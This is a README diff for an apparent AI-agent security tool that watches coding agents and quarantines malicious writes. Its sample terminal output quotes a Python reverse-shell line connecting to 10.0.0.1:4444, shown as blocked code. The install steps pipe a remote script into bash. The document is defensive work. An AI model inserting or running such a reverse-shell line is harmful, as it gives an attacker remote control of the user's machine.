@@ -23,6 +23,78 @@ Autonomous AI agents (such as Devin, Cursor, autonomous bots, or LLM-driven codi
 2. **Dynamic Policy Engine:** Compares detected capabilities against security presets (e.g., *Data Analysis*, *Strict Sandbox*) to issue an **`ALLOW`** or **`DENY`** verdict.
 3. **WebAssembly (WASI) Isolation:** Allowed code is compiled to WebAssembly (`wasm32-wasip1`) and executed inside a locked **Wasmtime** sandbox with instruction-level CPU fuel metering and memory bounds.
 4. **Automated GitHub PR Bot:** Intercepts Pull Requests via **Corsair**, checks all modified Rust files through the firewall, and automatically comments **`PASSED`** or **`BLOCKED`** with detailed telemetry on GitHub.
+5. **Terminal Inspector & Threat Hunter:** Real-time CLI observability tool that monitors AI agents (Claude Code, Cursor, Aider, Codex) and catches malicious code, reverse shells, credential theft, and recursive loops on the fly.
+
+---
+
+## ⚡ Terminal Inspector & Agent Threat Hunter
+
+> **Zero-latency local runtime that watches coding agents in real-time, hunts down malicious code before it executes, and enforces capability boundaries.**
+
+### 📥 1-Command Installation
+
+Install the CLI globally into your terminal:
+
+```bash
+# Option 1: Quick Install via curl (Mac/Linux)
+curl -fsSL https://raw.githubusercontent.com/deveshmishra11291/ai-agent-firewall/main/install.sh | bash
+
+# Option 2: Install via npm
+npm install -g agent-firewall
+
+# Option 3: Zero-Install via npx
+npx agent-firewall --help
+```
+
+### 🖥️ Real-Time Inspector In Action
+
+```bash
+# Watch your workspace as an agent writes code
+$ agent-firewall watch
+
+# Or wrap an agent command directly
+$ agent-firewall run claude
+$ agent-firewall run "python my_agent.py"
+```
+
+```text
+  ┌──────────────────────────────────────────────────────────────────────────────┐
+  │  🛡️  AI AGENT FIREWALL v1.0.0                                                │
+  │  Real-Time Observability & Threat Hunter for Autonomous AI Agents            │
+  │  Harnesses: Claude Code • Cursor • Codex • Aider • Copilot • Devin • Custom   │
+  └──────────────────────────────────────────────────────────────────────────────┘
+
+  [STATUS] Active  │  [POLICY] ZERO-TRUST ENFORCING  │  [TARGET] /my-workspace
+  Watching agent file generation and tool calls...
+
+  ↳ [ALLOW] agent wrote src/auth.ts (Risk Score: 0/100 • Clean) (10:14:02)
+  
+  ──────────────────────────────────────────────────────────────────────────
+  🚨 MALICIOUS AGENT CODE DETECTED  Interactive Reverse Shell (Severity: CRITICAL)
+  Target: src/network_helper.py:14
+  Attack Category: Reverse Shell
+  Rule Triggered: Detected unauthorized outbound interactive reverse shell.
+
+  Offending Code:
+    14 │ s = socket.socket(); s.connect(("10.0.0.1", 4444)); os.dup2(s.fileno(), 0)
+
+  🛡️  Action Taken: Execution Blocked & Quarantined to .firewall-quarantine/
+  ──────────────────────────────────────────────────────────────────────────
+
+  ↳ [QUARANTINED] Neutralized malicious write to src/network_helper.py
+  ↳ [LOOP DETECTED] Agent loop detected on src/models.py (3 identical writes)
+```
+
+### 🎯 CLI Command Matrix
+
+| Command | Description |
+| :--- | :--- |
+| `agent-firewall watch [dir]` | Watches directory in real-time as an agent edits files, hunting for malicious patterns |
+| `agent-firewall run <cmd...>` | Wraps and sandboxes an agent process (e.g. `agent-firewall run claude`) |
+| `agent-firewall scan <path>` | One-shot deep security scan of a repository, directory, or source file |
+| `agent-firewall test "code"` | Evaluates a prompt or code snippet against capability policies |
+| `agent-firewall init` | Generates a `.firewallrc.json` policy config file in your workspace |
+| `agent-firewall status` | Displays active firewall policy posture and backend connection status |
 
 ---
 
